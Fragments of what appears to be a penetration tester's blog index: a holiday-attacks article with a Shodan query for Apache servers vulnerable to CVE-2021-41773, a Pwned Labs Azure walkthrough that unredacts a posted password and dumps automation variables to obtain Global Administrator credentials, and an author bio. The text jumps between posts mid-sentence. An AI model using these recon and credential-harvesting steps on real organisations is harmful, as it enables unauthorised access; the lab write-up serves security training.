https://t.co/Dh4YtLJVxY. pic.twitter.com/Kb8E0HRFWq\n\u0026mdash; Los Angeles Unified (@LASchools) September 6, 2022 4. Exploitation of Delayed Patch Management During holidays, IT teams may delay routine updates and patches, leaving systems vulnerable to available known exploits/Common Vulnerabilities and Exposures (CVEs). Threat actors might capitalize on this gap where as launching attacks on unpatched systems, often leveraging automated scanning tools like shodan, whcih is a search engine for Internet-connected devices, to find entry points.\nBelow is a shodan query to discover Apache HTTP servers targetting a specific version known to have a critical vulnerability for example CVE-2021-41773, which allows path traversal and remote code execution.\nproduct:\u0026#34;Apache httpd\u0026#34; version:\u0026#34;2.4.49\u0026#34; Mitigation Strategies Haven\u0026rsquo;t covered all of this, there are still alot of attacks threat actors use to compromise companies during holiday periods, as the list is extensive, Now let look into the mitigation strategies to avoid the ones we have talked about :\n1. Proactive Monitoring : With the use of automated threat detetion and response systems in place, attacks like the supply chain attack could be avoided to fill gaps during reduced staffing.\n2. Employee Training : It is important for organizations to conduct holiday themed phishing simulations and trainings to raise awareness about seasonal scams.\n3. Incident Response Plans : A proper inident response lifecycle with contigency plans like detection and analysis, containment, eradication, recovery and post-incident activities for rapid response should be in place during holiday periods including on call staff rotations.\n4.

For further details checkout this blog Exploit Option 2 :\nWeb Apps can also connect to resources using connection strings stored in environment variables (via App settings). You can list all environment variables with the env command.

You are tasked with gaining initial access and demonstrating impact by increasing privileges.\nInitial Access and Privilege Escalation from Social Media Reconnaissance First of all we start by downloading the image this user posted on their social media from here The image says \u0026ldquo;#newoffice Rate.....\u0026rdquo; with a redacted text using a Markup\u0026rsquo;s pencil, which poses significant risk as shown in this forum However it is possible to use GIMP, An image manipulation program to retrieve the obscured text. Under the Colors drop down menu select Brightness-Contract.. and edit. We got the text SUMMERDAZE1! or maybe we can call it a password.\nThe next thing we need is this user actual username, We know they go by the name \u0026ldquo;Matteus Lundgren\u0026rdquo; but how is it saved on the domain ?.\nFor active directory On-Prem, I have found this tool to be useful as it creates a possible username from a given username and company name.\nHowever it is possible to guess this one as Mega Big Tech uses the below format :\n\u0026lt;firstname\u0026gt;@megabigtech.com `first.last@megabigtech.com With this format we can go ahead and try to login with a PS Session\naz login Which worked as shown in the below screenshot We can also confirm that we have successfully login with the below command PS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress/Az_lab\u0026gt; az account show { \u0026#34;environmentName\u0026#34;: \u0026#34;AzureCloud\u0026#34;, \u0026#34;homeTenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34;, \u0026#34;isDefault\u0026#34;: true, \u0026#34;managedByTenants\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;Microsoft Azure Sponsorship\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;Enabled\u0026#34;, \u0026#34;tenantDefaultDomain\u0026#34;: \u0026#34;megabigtech.com\u0026#34;, \u0026#34;tenantDisplayName\u0026#34;: \u0026#34;Default Directory\u0026#34;, \u0026#34;tenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxxxxx\u0026#34;, \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;matteus@megabigtech.com\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34; } } To understand the standpoint we are in, we can go ahead and list all resources that our current user has access to.

Sensitive variables like keys and passwords should be encrypted for security. However, in this instance, it appears that a sensitive variable was stored unencrypted, posing a security risk. This oversight could potentially grant unauthorized access to critical information, highlighting the importance of proper security practices in automation accounts.\nGet-AzAutomationVariable -ResourceGroupName \u0026#34;mbt-rg-5\u0026#34; -AutomationAccountName \u0026#34;automation-dev\u0026#34; | fl Name, Value, Description As shown above we have the flag value and a Global administrator credential, haha ᯓ★.\nSummary X Defense Employees often unintentionally expose sensitive information on social media, which red teams can exploit for phishing and password creation. In one case, an employee believed they had redacted sensitive data using iOS Markup, but it was recoverable due to transparency issues. Additionally, we exploited an exposed password in the .bash_history file, highlighting the risks of passing passwords via command lines, which can be logged in history files and Windows event logs, however to authenticate without a browser, we used az login --use-device-code to force device code authentication for more security. Finally, we obtained global admin credentials due to insecure secret storage, emphasizing the importance of saving sensitive data as encrypted variables, which are not encrypted by default.\nResources Lab Link : https://pwnedlabs.io/labs/unmask-privileged-access-in-azure https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0 https://medium.com/@mgbecken/roadtools-1e9dabc2c8e9 https://learn.microsoft.com/en-us/azure/automation/automation-security-overview ","permalink":"http://localhost:1313/hacking/unmask_privileged_access_in_azure/","summary":"\u003cp\u003e\u003cstrong\u003eNote : This article was inspired by content from Pwned Labs.

With no mentor or anyone to guide me, I began my journey using TryHackMe.com, YouTube, and Stack Overflow to learn. Later on, I took the Security+ course from ITPro.TV, which allowed me to grasp the basics of cybersecurity, covering areas such as Threats, Attacks, and Vulnerabilities, Cryptography, Cloud and Virtualization, Operational Security, and Incident Response.\nWith this, I was able to continue my learning journey with various other platforms like HackTheBox, PortSwigger, HackMyVM, Vulnix, etc., which gave me a higher advantage in gaining practical experience. Most notably, playing Boot2Root CTFs provided me with an opportunity to join a CTF team called \u0026ldquo;5h4d0wbr0k3r5,\u0026rdquo; giving me a more solid understanding of penetration testing.\nI then landed my first role as a web application penetration tester at a company in India. From there, I secured another job in Nigeria as a network penetration tester, where I gained substantial experience in technical skills like Active Directory and Linux administration. Additionally, I developed soft skills in managing co-workers and working effectively as part of a team.\nI was fortunate to have all my penetration testing exams sponsored, for which I am truly grateful. I have also made a lot of trustworthy and 1337 friends like hac, obx, n16ht4wk, ramsey, rami, fr3y, nerdy, ezequiel, Kunal and many others including someone who I am really looking upto, @hackingdave. I don\u0026rsquo;t know what the future holds, but continuous learning is key for me. I am eager to apply my skills and knowledge to real-world challenges in a dynamic company where I can contribute to and grow with the team.\n🏅 Checklists and Certifications This is a non-exhaustive list of certifications and courses I have taken.\nCertified Red Team Professional (badge here)\nOffensive Security Certified Professional (badge here)\nCertified Penetration Testing Specialist (badge here)\nJunior Penetration Tester (PT1) (badge here)\nDante, Penetration Tester Level II lab (badge here)\nZephyr, Red Team Operator Level I lab (badge here)\nFew CVEs under my belt; CVE-2024-44871, CVE-2024-44872, CVE-2024-55341, CVE-2024-55342\nCurrently reading the book “Penetration Testing Azure for Ethical Hackers” by David Okeyode and Karl Fosaaen\n🪟 Life outside of infosec, the last 20% Outside of cybersecurity, I am also passionate about other things. I enjoy making good food, building positive relationships, watching anime, and listening to good music. I listen to music while doing almost all of my day-to-day activities, which helps me achieve total concentration. Additionally, I am currently pursuing a degree in Criminology and Security Studies (BSc) at an Open University to expand my knowledge in addressing real-world challenges. This program enhances my understanding of criminal behavior and law enforcement, providing a broader perspective on how to protect systems and data from various threats.\n✨ Future plans I plan to pursue in the field of Cloud Security and Penetration Testing. My goal, is never to be the best but to always keep learning, improving, and making a meaningful impact in the field of Cyber security.\nThe key to accomplishing all that you ever wanted, the key to changing who you are, the key to reaching new heights, the key to limitless personal power… Is just believing in yourself; - Mr. Ping\n","permalink":"http://localhost:1313/whoami/","summary":"\u003chr\u003e\n\u003ch3 id=\"-introduction\"\u003e❓ Introduction\u003c/h3\u003e\n\u003cp\u003eHii, I am a 20 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience.
